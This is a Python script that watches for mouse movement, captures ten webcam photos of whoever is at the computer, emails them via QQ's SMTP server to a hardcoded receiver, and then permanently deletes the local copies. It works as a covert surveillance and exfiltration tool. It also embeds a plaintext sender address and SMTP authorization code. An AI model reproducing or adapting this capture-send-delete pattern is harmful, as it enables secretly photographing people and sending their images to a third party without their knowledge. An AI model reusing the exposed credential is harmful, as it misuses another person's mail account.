# -*- coding : utf-8 -*-
# Time       : 2021/7/26 10:08
# Author     : MurphyHou
# Proj_Name  : cv_capture
# File_Name  : capture_demo4.py
# Software   : PyCharm
# =======Here We Go!=======

#设置把程序运行过程中拍摄的照片在发送成功之后删除掉
import cv2
from pynput.mouse import Listener
import yagmail
import os

mouse_return=0

def on_move(x,y):# 监听鼠标的位置
    # print("mouse:{}".format(x,y))
    global mouse_return
    mouse_return=x

    return False  # 不能返回True,否则程序不会停止


def send_mail():
    # 设置邮箱服务器
    mail_host="smtp.qq.com"
    # 设置发送方邮箱————最好使用小号邮箱吧，免得引发什么误会
    mail_sender='3168291829@qq.com'
    # 设置发送方邮箱密码
    mail_pass="dsouvylewkntdgdf" #7.26 第一个授权码
    # 设置接受方邮箱————最好使用小号邮箱吧，免得引发什么误会
    mail_receiver='1416790341@qq.com'
    # mail_receiver['xxx.qq.com','xxx.163.com','xxx.outlook.com'] # 设置多个接收方

    yag = yagmail.SMTP(user=mail_sender,password=mail_pass,host=mail_host)

    contents=\
        ['capture pictures',#邮件正文中写入文字
         yagmail.inline('MurphyHou_capture_5.jpg'),# 邮件正文中直接插入照片
         'MurphyHou_capture_1.jpg',# 邮件中按附件方式发送图片
         'MurphyHou_capture_2.jpg',
         'MurphyHou_capture_3.jpg',
         'MurphyHou_capture_4.jpg',
         'MurphyHou_capture_6.jpg',
         'MurphyHou_capture_7.jpg',
         'MurphyHou_capture_8.jpg',
         'MurphyHou_capture_9.jpg',
         'MurphyHou_capture_10.jpg'
         ]
    try:

        yag.send(to=mail_receiver,subject="from yagmail_cv_capture",contents=contents)
        print("Send Success!")
    except Exception as error:
        print("Error:",error)


def delete():
    for i in range(1,11):
        file_name="MurphyHou_capture_"+str(i)+".jpg"

        if os.path.isfile(file_name):
            os.remove(file_name)
        else:
            print("fie {} doesn't exit!".format(file_name))

    print("Delete Success!")


if __name__=="__main__":
    with Listener(on_move=on_move) as listener:
        listener.join()

    cap=cv2.VideoCapture(0)#创建对象
    num=1
    while(cap.isOpened()):#当摄像头被打开时，循环捕捉帧
        while(num<11):#设置拍摄10张照片
            ret_flag, image_show = cap.read()  # 函数返回值是有两个参数
            cv2.imshow("Capture", image_show)  # 创建窗口，窗口的显示值为捕捉的图像，名称为Capture
            if mouse_return!=0:  # 当鼠标发生移动时触发程序
                # 设置窗口大小
                cap.get(4)
                cap.get(3)

                # print("success:"+str(num))
                cv2.imwrite("MurphyHou_capture_"+str(num) + ".jpg", image_show)
                num += 1

        cap.release()
        cv2.destroyAllWindows()   #放到检测摄像头是否处于开状态的while循环之内，就能保证窗口在程序运行结束之后可以自动关闭

        send_mail()

        delete()#绝对删除，不会存在回收站中